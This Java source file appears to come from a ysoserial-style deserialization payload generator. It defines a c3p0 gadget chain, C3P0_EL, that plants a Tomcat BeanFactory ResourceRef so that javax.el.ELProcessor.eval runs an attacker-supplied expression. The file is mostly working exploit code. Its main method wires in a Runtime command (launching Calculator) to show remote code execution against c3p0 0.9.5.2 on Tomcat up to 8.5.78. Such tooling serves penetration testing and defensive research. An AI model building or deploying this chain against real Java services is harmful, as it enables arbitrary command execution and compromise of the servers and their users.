package com.ppp.chain.c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * EL
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache.tomcat:<=8.5.78"})
@Authors({Authors.MBECHLER})
@Sink({Sink.C3P0})
public class C3P0_EL implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(C3P0.class, args);

        // rce
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(C3P0_EL.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.Command);
        sinksHelper.setCommandType(EnchantEnums.Runtime);
        sinksHelper.setCommand("open -a Calculator.app");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(C3P0_EL.class, args, sinksHelper);

        // 字节码加载
//        SinksHelper sinksHelper = new SinksHelper();
//        sinksHelper.setSink(C3P0_2.class.getAnnotation(Sink.class).value()[0]);
//        sinksHelper.setEnchant(EnchantType.JavaClass);
//        sinksHelper.setSave(true);
//        JavaClassHelper javaClassHelper = new JavaClassHelper();
//        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
//        javaClassHelper.setMiddleware(Middleware.Tomcat);
//        javaClassHelper.setRandomJavaClassName(false);
//        sinksHelper.setJavaClassHelper(javaClassHelper);
//        PayloadRunner.run(C3P0_2.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);
        System.out.println(sinkObject);

        Object kickOffObject = getChain(sinkObject.toString());

        return kickOffObject;
    }

    public Object getChain(String script) throws Exception {
//        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
//        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        /**
         * Ref: https://github.com/frohoff/ysoserial/pull/184
         */
        PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(script));

        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String script;

        public PoolSource(String script) {
            this.script = script;
        }

        public Reference getReference() throws NamingException {
            String s = RanDomUtils.generateRandomString(3);
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            resourceRef.add(new StringRefAddr("forceString", s + "=eval"));

            resourceRef.add(new StringRefAddr(s, script));
            return resourceRef;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

    }
}
